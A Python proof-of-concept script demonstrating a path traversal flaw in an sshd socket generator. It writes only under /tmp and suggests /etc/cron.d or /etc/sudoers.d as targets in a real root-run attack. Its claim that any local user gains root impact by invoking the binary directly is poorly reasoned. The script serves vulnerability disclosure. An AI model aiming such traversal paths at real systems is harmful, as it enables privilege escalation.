#!/usr/bin/env python3
"""
PoC #3 — Path Traversal via Unvalidated argv[1]
================================================
Finding : MEDIUM  (README-sshd-security-flaws.md #3)
File    : sshd-socket-generator.c:327
Branch  : master (unfixed)

Vulnerability
-------------
    destdir = argv[1];                           // no validation
    r = write_systemd_socket_file(destdir);      // mkdir + fopen under destdir

sshd-socket-generator creates:
    <destdir>/ssh.socket.d/           (directory)
    <destdir>/ssh.socket.d/addresses.conf  (file)

No check is made that destdir is absolute, within an expected tree, or free
of traversal components.  Passing a path such as:

    /tmp/legit/../../../tmp/attacker_controlled

causes the generator to create files at /tmp/attacker_controlled/ssh.socket.d/
instead.

Because the generator runs as root (invoked by systemd PID 1), a traversal
path can be used to create or truncate files in arbitrary root-owned
directories — for example /etc/cron.d, /etc/systemd/system/, etc.

Attack vector
-------------
Systemd generators are invoked with three fixed directory arguments (normal,
early, late output dirs).  However, the binary is world-executable, so any
local user can invoke it directly with an arbitrary argument.

This PoC runs entirely in /tmp and requires no special privileges.
"""

import os
import sys
import shutil
import subprocess
import tempfile

BINARY = os.path.realpath(
    os.path.join(os.path.dirname(__file__), '..', 'sshd-socket-generator')
)

def main():
    print("=" * 60)
    print("PoC #3 — Path traversal via unvalidated argv[1]")
    print("=" * 60)
    print()

    if not os.path.isfile(BINARY):
        print(f"[!] Binary not found: {BINARY}")
        print("    Run 'make' in the project root first.")
        sys.exit(1)

    with tempfile.TemporaryDirectory(prefix='poc3_legit_') as legit_dir:
        # The traversal target: one level above legit_dir
        parent = os.path.dirname(legit_dir)
        target_name = 'poc3_traversal_target'
        target_dir  = os.path.join(parent, target_name)

        # The traversal payload: start inside legit_dir, go up, land in target
        traversal_arg = os.path.join(legit_dir, '..', target_name)

        print(f"[*] Binary         : {BINARY}")
        print(f"[*] Intended dir   : {legit_dir}")
        print(f"[*] Traversal arg  : {traversal_arg}")
        print(f"[*] Expected target: {target_dir}")
        print()

        # Ensure target does not exist before the attack
        if os.path.exists(target_dir):
            shutil.rmtree(target_dir)

        print(f"[*] Before: target dir exists? {os.path.exists(target_dir)}")

        # Invoke the generator with the traversal path
        result = subprocess.run(
            [BINARY, traversal_arg],
            capture_output=True, text=True,
        )

        print(f"[*] Generator exit code: {result.returncode}")
        if result.stderr:
            print(f"[*] stderr: {result.stderr.strip()}")

        # Check whether the traversal directory was created
        traversal_subdir = os.path.join(target_dir, 'ssh.socket.d')
        created = os.path.exists(target_dir) or os.path.exists(traversal_subdir)
        print(f"[*] After : target dir exists? {os.path.exists(target_dir)}")
        print(f"[*] After : ssh.socket.d exists? {os.path.exists(traversal_subdir)}")
        print()

        if created:
            print("[+] VULNERABLE — directory created OUTSIDE the intended path.")
            print(f"    mkdir was called on: {traversal_subdir}")
            print()
            print("    In a real attack (running as root) an attacker could use")
            print("    a traversal path targeting /etc/cron.d, /etc/sudoers.d,")
            print("    or /etc/systemd/system to create directories or files in")
            print("    those locations.")
        else:
            print("[-] Directory not created — binary may already be patched,")
            print("    or the OS resolved the traversal before mkdir was called.")

        # Cleanup
        if os.path.exists(target_dir):
            shutil.rmtree(target_dir)

    print()
    print("[*] Fix: reject argv[1] that does not start with '/'")
    print("    (applied on branch security-flaw-fixes)")

if __name__ == '__main__':
    main()
